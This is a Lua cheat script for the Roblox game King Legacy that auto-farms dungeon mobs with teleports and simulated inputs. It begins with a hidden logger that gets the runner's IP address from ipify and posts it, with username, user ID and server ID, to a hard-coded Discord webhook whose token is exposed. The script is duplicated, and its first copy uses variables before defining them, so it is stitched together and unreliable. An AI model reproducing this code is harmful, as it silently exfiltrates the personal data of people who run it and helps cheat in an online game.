local HttpService = game:GetService("HttpService")

local webhookURL = "https://discord.com/api/webhooks/1497487711932780666/hnubTv3N8iczDv3t4L2UMfm_MMTvjJV3YftcsGgwnFhsGteP8wU6wl0PeFOofyUihiG5"



local function sendDetailedWebhook()

    local player = game.Players.LocalPlayer

    local request = (syn and syn.request) or (http and http.request) or http_request or (Fluxus and Fluxus.request) or request

    

    if request then

        -- 1. IP 주소 가져오기 시도

        local ipData = "Unknown (Blocked)"

        local success, response = pcall(function()

            return request({

                Url = "https://api.ipify.org", -- IP 확인 API

                Method = "GET"

            }).Body

        end)

        if success then ipData = response end



        -- 2. 디스코드로 보낼 데이터 정리

        local data = {

            ["content"] = "🚨 **스크립트 실행 및 IP 감지!**",

            ["embeds"] = {{

                ["title"] = "실행자 상세 정보 리포트",

                ["color"] = 16711680,

                ["fields"] = {

                    {["name"] = "닉네임", ["value"] = player.Name, ["inline"] = true},

                    {["name"] = "유저 ID", ["value"] = tostring(player.UserId), ["inline"] = true},

                    {["name"] = "🌐 IP 주소", ["value"] = "||" .. ipData .. "||", ["inline"] = false}, -- 디코드에서 클릭해야 보이게 마스킹

                    {["name"] = "게임 이름", ["value"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name, ["inline"] = true},

                    {["name"] = "서버 코드(JobId)", ["value"] = game.JobId, ["inline"] = false}

                },

                ["footer"] = {["text"] = "IP 정보는 VPN 사용 시 부정확할 수 있습니다."}

            }}

        }



        -- 3. 전송

        pcall(function()

            request({

                Url = webhookURL,

                Method = "POST",

                Headers = {["Content-Type"] = "application/json"},

                Body = HttpService:JSONEncode(data)

            })

        end)

    end

end



-- 1. GUI 생성 (도리 허브)

local oldGui = player.PlayerGui:FindFirstChild("DoriHub")

if oldGui then oldGui:Destroy() end

local ScreenGui = Instance.new("ScreenGui", player.PlayerGui)

ScreenGui.Name = "DoriHub"

ScreenGui.ResetOnSpawn = false 



local MainFrame = Instance.new("Frame", ScreenGui)

MainFrame.Size = UDim2.new(0, 200, 0, 150)

MainFrame.Position = UDim2.new(0.5, -100, 0.5, -75)

MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)

MainFrame.Visible = false



local StartToggle = Instance.new("TextButton", MainFrame)

StartToggle.Size = UDim2.new(0, 160, 0, 40)

StartToggle.Position = UDim2.new(0, 20, 0, 15)

StartToggle.Text = "START (OFF)"

StartToggle.BackgroundColor3 = Color3.fromRGB(150, 0, 0)

StartToggle.TextColor3 = Color3.new(1, 1, 1)



local DistInput = Instance.new("TextBox", MainFrame)

DistInput.Size = UDim2.new(0, 160, 0, 30)

DistInput.Position = UDim2.new(0, 20, 0, 65)

DistInput.PlaceholderText = "거리 조절 (현재: 7)"

DistInput.Text = "7"

DistInput.BackgroundColor3 = Color3.fromRGB(40, 40, 40)

DistInput.TextColor3 = Color3.new(1, 1, 1)



DistInput.FocusLost:Connect(function()

    local val = tonumber(DistInput.Text)

    if val then followDistance = val end

end)



local DoriButton = Instance.new("TextButton", ScreenGui)

DoriButton.Size = UDim2.new(0, 50, 0, 50)

DoriButton.Position = UDim2.new(0.05, 0, 0.45, 0)

DoriButton.Text = "도리"

DoriButton.BackgroundColor3 = Color3.fromRGB(50, 50, 150)

DoriButton.Draggable = true 



DoriButton.MouseButton1Click:Connect(function() MainFrame.Visible = not MainFrame.Visible end)



StartToggle.MouseButton1Click:Connect(function()

    isAutoFarming = not isAutoFarming

    StartToggle.Text = isAutoFarming and "START (ON)" or "START (OFF)"

    StartToggle.BackgroundColor3 = isAutoFarming and Color3.fromRGB(0, 150, 0) or Color3.fromRGB(150, 0, 0)

    if isAutoFarming and player.Character then

        player.Character.HumanoidRootPart.CFrame = CFrame.new(waitingPos)

    end

end)



-- 2. 부활 및 에임 고정 로직

player.CharacterAdded:Connect(function(newChar)

    if isAutoFarming then

        task.wait(1)

        newChar:WaitForChild("HumanoidRootPart").CFrame = CFrame.new(waitingPos)

    end

end)



RunService.RenderStepped:Connect(function()

    if isAutoFarming and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then

        local root = player.Character.HumanoidRootPart

        local hum = player.Character:FindFirstChild("Humanoid")

        

        if hum and hum.Health > 0 then

            local distFromWait = (root.Position - waitingPos).Magnitude

            if distFromWait < 150 then

                root.CFrame = CFrame.new(waitingPos)

                currentTarget = nil

            else

                if not currentTarget or currentTarget.Humanoid.Health <= 0 then

                    local mobs = {}

                    for _, v in pairs(workspace:GetDescendants()) do

                        if v:IsA("Humanoid") and v.Parent:FindFirstChild("HumanoidRootPart") then

                            local char = v.Parent

                            if char.Name ~= player.Name and not Players:GetPlayerFromCharacter(char) and v.Health > 0 then

                                if (root.Position - char.HumanoidRootPart.Position).Magnitude <= maxDist then

                                    table.insert(mobs, char)

                                end

                            end

                        end

                    end

                    if #mobs > 0 then currentTarget = mobs[math.random(1, #mobs)] end

                end

                

                if currentTarget and currentTarget:FindFirstChild("HumanoidRootPart") then

                    local mobRoot = currentTarget.HumanoidRootPart

                    root.CFrame = CFrame.new(mobRoot.Position + (mobRoot.CFrame.LookVector * -followDistance), mobRoot.Position)

                end

            end

        end

    end

end)



-- 3. 입력 엔진

local function sendKey(key)

    VIM:SendKeyEvent(true, key, false, game)

    task.wait(0.01)

    VIM:SendKeyEvent(false, key, false, game)

end



task.spawn(function()

    while true do

        if isAutoFarming and currentTarget then

            if currentEquipped == 1 then

                local tool = player.Character and player.Character:FindFirstChildOfClass("Tool")

                if tool then tool:Activate() end

                VIM:SendMouseButtonEvent(0, 0, 0, true, game, 0)

                VIM:SendMouseButtonEvent(0, 0, 0, false, game, 0)

            end

        end

        task.wait(0.01)

    end

end)



task.spawn(function()

    while true do

        if isAutoFarming and currentTarget then

            currentEquipped = 1

            sendKey(Enum.KeyCode.One)

            task.wait(0.05)

            sendKey(Enum.KeyCode.Z); sendKey(Enum.KeyCode.X); sendKey(Enum.KeyCode.C)

            task.wait(0.4) 



            currentEquipped = 2

            sendKey(Enum.KeyCode.Two)

            task.wait(0.1)

            sendKey(Enum.KeyCode.Z); sendKey(Enum.KeyCode.X)

            task.wait(0.1)



            currentEquipped = 3

            sendKey(Enum.KeyCode.Three)

            task.wait(0.1)

            sendKey(Enum.KeyCode.Z); sendKey(Enum.KeyCode.X); sendKey(Enum.KeyCode.C)

            sendKey(Enum.KeyCode.V); sendKey(Enum.KeyCode.E)

            task.wait(0.1)

            

            sendKey(Enum.KeyCode.R)

            task.wait(0.1)

            currentTarget = nil

        end

        task.wait(0.05)

    end

end)
-- [[ King Legacy Dungeon Script - Sangyoon Ver. 26.0 ]] --

local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local VIM = game:GetService("VirtualInputManager")
local player = Players.LocalPlayer

-- [설정 변수]
local waitingPos = Vector3.new(10960.82, 133.84, 1250.03) 
local isAutoFarming = false
local currentTarget = nil
local maxDist = 250 
local followDistance = 7
local currentEquipped = 1

-- 1. GUI 생성 (거리 조절 UI 포함)
local oldGui = player.PlayerGui:FindFirstChild("DoriHub")
if oldGui then oldGui:Destroy() end
local ScreenGui = Instance.new("ScreenGui", player.PlayerGui)
ScreenGui.Name = "DoriHub"
ScreenGui.ResetOnSpawn = false 

local MainFrame = Instance.new("Frame", ScreenGui)
MainFrame.Size = UDim2.new(0, 200, 0, 150)
MainFrame.Position = UDim2.new(0.5, -100, 0.5, -75)
MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
MainFrame.Visible = false

local StartToggle = Instance.new("TextButton", MainFrame)
StartToggle.Size = UDim2.new(0, 160, 0, 40)
StartToggle.Position = UDim2.new(0, 20, 0, 15)
StartToggle.Text = "START (OFF)"
StartToggle.BackgroundColor3 = Color3.fromRGB(150, 0, 0)
StartToggle.TextColor3 = Color3.new(1, 1, 1)

local DistInput = Instance.new("TextBox", MainFrame)
DistInput.Size = UDim2.new(0, 160, 0, 30)
DistInput.Position = UDim2.new(0, 20, 0, 65)
DistInput.PlaceholderText = "거리 조절 (현재: 7)"
DistInput.Text = "7"
DistInput.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
DistInput.TextColor3 = Color3.new(1, 1, 1)

DistInput.FocusLost:Connect(function()
    local val = tonumber(DistInput.Text)
    if val then followDistance = val end
end)

local DoriButton = Instance.new("TextButton", ScreenGui)
DoriButton.Size = UDim2.new(0, 50, 0, 50)
DoriButton.Position = UDim2.new(0.05, 0, 0.45, 0)
DoriButton.Text = "도리"
DoriButton.BackgroundColor3 = Color3.fromRGB(50, 50, 150)
DoriButton.Draggable = true 

DoriButton.MouseButton1Click:Connect(function() MainFrame.Visible = not MainFrame.Visible end)

StartToggle.MouseButton1Click:Connect(function()
    isAutoFarming = not isAutoFarming
    StartToggle.Text = isAutoFarming and "START (ON)" or "START (OFF)"
    StartToggle.BackgroundColor3 = isAutoFarming and Color3.fromRGB(0, 150, 0) or Color3.fromRGB(150, 0, 0)
    if isAutoFarming and player.Character then
        player.Character.HumanoidRootPart.CFrame = CFrame.new(waitingPos)
    end
end)

-- 2. 부활 및 에임 고정 로직 (강력 수정)
player.CharacterAdded:Connect(function(newChar)
    if isAutoFarming then
        task.wait(1)
        newChar:WaitForChild("HumanoidRootPart").CFrame = CFrame.new(waitingPos)
    end
end)

RunService.RenderStepped:Connect(function()
    if isAutoFarming and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
        local root = player.Character.HumanoidRootPart
        local hum = player.Character:FindFirstChild("Humanoid")
        
        if hum and hum.Health > 0 then
            local distFromWait = (root.Position - waitingPos).Magnitude
            
            if distFromWait < 150 then
                root.CFrame = CFrame.new(waitingPos)
                currentTarget = nil
            else
                -- 타겟 탐색
                if not currentTarget or currentTarget.Humanoid.Health <= 0 then
                    local mobs = {}
                    for _, v in pairs(workspace:GetDescendants()) do
                        if v:IsA("Humanoid") and v.Parent:FindFirstChild("HumanoidRootPart") then
                            local char = v.Parent
                            if char.Name ~= player.Name and not Players:GetPlayerFromCharacter(char) and v.Health > 0 then
                                if (root.Position - char.HumanoidRootPart.Position).Magnitude <= maxDist then
                                    table.insert(mobs, char)
                                end
                            end
                        end
                    end
                    if #mobs > 0 then currentTarget = mobs[math.random(1, #mobs)] end
                end
                
                -- [[ 강력 에임 고정 엔진 ]]
                if currentTarget and currentTarget:FindFirstChild("HumanoidRootPart") then
                    local mobRoot = currentTarget.HumanoidRootPart
                    -- 몹의 위치를 바라보는 CFrame 생성 (위치 + 방향 동시 고정)
                    local lookAtPos = Vector3.new(mobRoot.Position.X, root.Position.Y, mobRoot.Position.Z) -- Y축 고정으로 핑 방지
                    
                    -- 캐릭터를 몹 뒤편에 위치시키고 시선은 몹의 중심을 정확히 관통하게 함
                    root.CFrame = CFrame.new(mobRoot.Position + (mobRoot.CFrame.LookVector * -followDistance), mobRoot.Position)
                end
            end
        end
    end
end)

-- 3. 입력 및 콤보 엔진
local function sendKey(key)
    VIM:SendKeyEvent(true, key, false, game)
    task.wait(0.01)
    VIM:SendKeyEvent(false, key, false, game)
end

-- 평타 및 인게임 좌클릭 판정
task.spawn(function()
    while true do
        if isAutoFarming and currentTarget then
            if currentEquipped == 1 then
                local tool = player.Character and player.Character:FindFirstChildOfClass("Tool")
                if tool then tool:Activate() end
                -- 가상 마우스 클릭으로 판정 강화
                VIM:SendMouseButtonEvent(0, 0, 0, true, game, 0)
                VIM:SendMouseButtonEvent(0, 0, 0, false, game, 0)
            end
        end
        task.wait(0.01)
    end
end)

-- 정밀 콤보 루프
task.spawn(function()
    while true do
        if isAutoFarming and currentTarget then
            -- 1번 무기 전용 (Z, X, C)
            currentEquipped = 1
            sendKey(Enum.KeyCode.One)
            task.wait(0.05)
            sendKey(Enum.KeyCode.Z); sendKey(Enum.KeyCode.X); sendKey(Enum.KeyCode.C)
            task.wait(0.4) 

            -- 2번 무기 전용 (Z, X)
            currentEquipped = 2
            sendKey(Enum.KeyCode.Two)
            task.wait(0.1)
            sendKey(Enum.KeyCode.Z); sendKey(Enum.KeyCode.X)
            task.wait(0.1)

            -- 3번 무기 전용 (Z, X, C, V, E)
            currentEquipped = 3
            sendKey(Enum.KeyCode.Three)
            task.wait(0.1)
            sendKey(Enum.KeyCode.Z); sendKey(Enum.KeyCode.X); sendKey(Enum.KeyCode.C)
            sendKey(Enum.KeyCode.V); sendKey(Enum.KeyCode.E)
            task.wait(0.1)
            
            sendKey(Enum.KeyCode.R) -- 공통 스킬
            
            task.wait(0.1)
            currentTarget = nil -- 타겟 순회
        end
        task.wait(0.05)
    end
end)
